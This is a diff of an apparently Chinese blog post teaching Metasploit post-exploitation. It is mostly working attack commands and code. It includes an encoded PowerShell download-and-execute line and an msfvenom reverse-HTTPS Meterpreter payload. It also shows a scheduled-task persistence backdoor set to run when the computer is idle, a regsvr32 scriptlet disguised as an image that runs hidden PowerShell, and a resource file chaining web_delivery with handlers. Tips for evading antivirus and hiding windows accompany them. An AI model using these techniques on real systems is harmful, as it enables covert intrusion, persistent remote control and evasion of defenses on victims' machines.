 <pre><code>powershell -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUgBpAGQAdABlAHIALwBQAGUAbgB0AGUAcwB0AC8AbQBhAHMAdABlAHIALwBwAG8AdwBlAHIAcwBoAGUAbABsAC8ARABlAG0AbwBTAGgAZQBsAGwALwBzAGMAaAB0AGEAcwBrAHMALgBwAHMAMQAnACkAOwAKAA==
 </code></pre><p>之后我们就需要用到multicommand脚本了，自动运行的命令为：</p>
-<pre><code>set autorunscript &apos;multicommand -cl &quot;powershell -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUgBpAGQAdABlAHIALwBQAGUAbgB0AGUAcwB0AC8AbQBhAHMAdABlAHIALwBwAG8AdwBlAHIAcwBoAGUAbABsAC8ARABlAG0AbwBTAGgAZQBsAGwALwBzAGMAaAB0AGEAcwBrAHMALgBwAHMAMQAnACkAOwAKAA==&quot;&apos;
+<pre><code>set autorunscript &#39;multicommand -cl &quot;powershell -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUgBpAGQAdABlAHIALwBQAGUAbgB0AGUAcwB0AC8AbQBhAHMAdABlAHIALwBwAG8AdwBlAHIAcwBoAGUAbABsAC8ARABlAG0AbwBTAGgAZQBsAGwALwBzAGMAaAB0AGEAcwBrAHMALgBwAHMAMQAnACkAOwAKAA==&quot;&#39;
 </code></pre><p>演示如下：</p>
 <p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/2066d69233e0b457b592.gif" alt=""></p>
 <p>现在我们就在获取meterpreter会话之后，绕过拦截自动创建了计划任务，至于怎么样使用计划任务创建一个后门，其实已经有了现成的powershell脚本。请看拓展。</p>
@@ -788,8 +928,10 @@ run scheduleme -m 1 -c &quot;cmd /c calc.exe&quot; # 创建计划任务每一分
 <p>加载Persistence模块：</p>
 <pre><code>PS C:/Persistence&gt; Import-Module ./Persistence.psm1
 </code></pre><p>因为常常我们希望在没有最高权限的情况下创建后门，为了避免杀软，尽量不使用添加注册表的方式，所以，这里依然使用计划任务的方式来创建，执行时间是计算机空闲状态执行。具体命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PS C:/Persistence&gt; $ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle</div><div class="line">PS C:/Persistence&gt; $UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle</div><div class="line">PS C:/Persistence&gt; Add-Persistence -FilePath ./evil.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose</div></pre></td></tr></table></figure>
-<p>可以看脚本说明更改触发条件</p>
+<pre><code>PS C:/Persistence&gt; $ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
+PS C:/Persistence&gt; $UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle
+PS C:/Persistence&gt; Add-Persistence -FilePath ./evil.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose
+</code></pre><p>可以看脚本说明更改触发条件</p>
 <p>evil.ps1是计划任务要执行的payload，可以使用以下命令来生成。</p>
 <pre><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.2.101 lport=7777 -f psh-reflection -o evil.ps1
 </code></pre><p>最终生成脚本如下：</p>
@@ -797,26 +939,55 @@ run scheduleme -m 1 -c &quot;cmd /c calc.exe&quot; # 创建计划任务每一分
 <p>2、测试脚本功能：</p>
 <p>将Persistence.ps1 脚本放到web上通过IEX来加载。创建成功以后当电脑空闲时，会执行命令，从而产生meterpreter会话。</p>
 <p>测试方式为执行以下命令：</p>
-<pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://domain.com/Persistence.ps1&apos;); &quot;
+<pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://domain.com/Persistence.ps1&#39;); &quot;
 </code></pre><p>在这里发现一个小BUG，运行脚本的时候，执行的POWERSHELL对话框并不会隐藏，解决方式是修改PERSISTENCE.PS1 ，找到POWERSHELL.EXE -NONINTERACTIVE 并添加 -W HIDDEN 参数。如果有已经有了CMD权限，可以直接执行此命令添加计划任务后门，这里设置为获取METERPRETER之后自动执行是为了在通过某些其他漏洞获取METERPRETER会话之后自动创建计划任务后门。</p>
 <p>测试发现脚本可以实现我们想要的功能。</p>
 <p>3、构造Autorunscript命令：</p>
 <p>现在要做的就是把Auturunscript以及Persistence.ps1相结合使用，由于命令中存在引号，可以根据前文中提到的方式进行编码处理。但是，经过测试，按照上文中的方式执行是有问题的，multicommand执行会等待程序执行结束并获取执行结果，这样一来，由于执行的进程不会退出且无回显，所以，会导致程序报错！</p>
 <p>多次测试以后，找到了解决方式，即使用<a href="http://drops.wooyun.org/tips/15124所讲的方式。" target="_blank" rel="external">http://drops.wooyun.org/tips/15124所讲的方式。</a></p>
 <p>构造sct文件如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;scriptlet&gt;</div><div class="line">&lt;registration</div><div class="line">    progid=&quot;ShortJSRAT&quot;</div><div class="line">    classid=&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt;</div><div class="line">    &lt;!-- Learn from Casey Smith @subTee --&gt;</div><div class="line">    &lt;script language=&quot;JScript&quot;&gt;</div><div class="line">        &lt;![CDATA[</div><div class="line">            rat = &quot;base64codes&quot;</div><div class="line">            ps  = &quot;cmd.exe /c powershell -window hidden -enc &quot;</div><div class="line">            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps + rat,0,true);</div><div class="line"></div><div class="line">        ]]&gt;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/registration&gt;</div><div class="line">&lt;/scriptlet&gt;</div></pre></td></tr></table></figure>
-<p>将以上内容命名为test.jpg并放到web服务器上（替换掉base64codes），之后执行</p>
+<pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+    progid=&quot;ShortJSRAT&quot;
+    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;
+    &lt;!-- Learn from Casey Smith @subTee --&gt;
+    &lt;script language=&quot;JScript&quot;&gt;
+        &lt;![CDATA[
+            rat = &quot;base64codes&quot;
+            ps  = &quot;cmd.exe /c powershell -window hidden -enc &quot;
+            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps + rat,0,true);
+
+        ]]&gt;
+&lt;/script&gt;
+&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre><p>将以上内容命名为test.jpg并放到web服务器上（替换掉base64codes），之后执行</p>
 <pre><code>regsvr32 /u /s /i:http://domain.com/test.jpg scrobj.dll
 </code></pre><p>与执行powershell的命令是等价的。并且会通过regsvr32开启新的进程而不影响multicommand的执行。</p>
 <p>所以最终要设置的内容为：</p>
-<pre><code>set autorunscript &apos;multicommand -cl &quot;regsvr32 /u /s /i:http://domain.com/test.jpg scrobj.dll&quot;&apos;
+<pre><code>set autorunscript &#39;multicommand -cl &quot;regsvr32 /u /s /i:http://domain.com/test.jpg scrobj.dll&quot;&#39;
 </code></pre><p>当获取meterpreter会话以后，自动执行命令安装后门：</p>
 <p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/fc803d5c067056b0ad99.png" alt=""></p>
 <p>这样，两者就完美的结合了。重启以后，空闲状态时，脚本执行，重新获取meterpreter会话。这里就不截图了。</p>
 <p>以上命令可写入rc文件方便运行：</p>
 <pre><code>payload.rc：
-</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/script/web_delivery</div><div class="line">set target 2</div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.2.101</div><div class="line">set lport 6666</div><div class="line">set uripath /</div><div class="line">set ExitOnSession false</div><div class="line">set autorunscript &apos;multicommand -cl &quot;regsvr32 /u /s /i:http://domain.com/test.jpg scrobj.dll&quot;&apos;</div><div class="line">exploit -j</div><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/x64/meterpreter/reverse_https</div><div class="line">set lhost 192.168.2.101</div><div class="line">set lport 7777</div><div class="line">set ExitOnSession false</div><div class="line">exploit -j</div></pre></td></tr></table></figure>
-<p>自己配置修改相关选项</p>
+</code></pre><pre><code>use exploit/multi/script/web_delivery
+set target 2
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.2.101
+set lport 6666
+set uripath /
+set ExitOnSession false
+set autorunscript &#39;multicommand -cl &quot;regsvr32 /u /s /i:http://domain.com/test.jpg scrobj.dll&quot;&#39;
+exploit -j
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost 192.168.2.101
+set lport 7777
+set ExitOnSession false
+exploit -j
+</code></pre><p>自己配置修改相关选项</p>
 <h2 id="—"><a href="#—" class="headerlink" title="—"></a>—</h2><h1 id="模块使用"><a href="#模块使用" class="headerlink" title="模块使用"></a>模块使用</h1><h1 id="系统部分"><a href="#系统部分" class="headerlink" title="系统部分"></a>系统部分</h1><h2 id="活跃主机扫描"><a href="#活跃主机扫描" class="headerlink" title="活跃主机扫描"></a>活跃主机扫描</h2><p><em>Metasploit主机发现模块</em></p>
 <p>模块位于源码路径的modules/auxiliary/scanner/discovery/  </p>
 <p>主要有</p>
@@ -1076,7 +1247,7 @@ msf&gt;exploit
     &gt; set SRVPORT 8080
     &gt; exploit
 </code></pre><p>查看可以被利用的模块信息</p>
-<pre><code>&gt; jobs
+<pre><code>    &gt; jobs
 </code></pre><p><em>*转载请注明来自<a href="https://ares-x.com">AresX’s Blog</a></em></p>
 
     
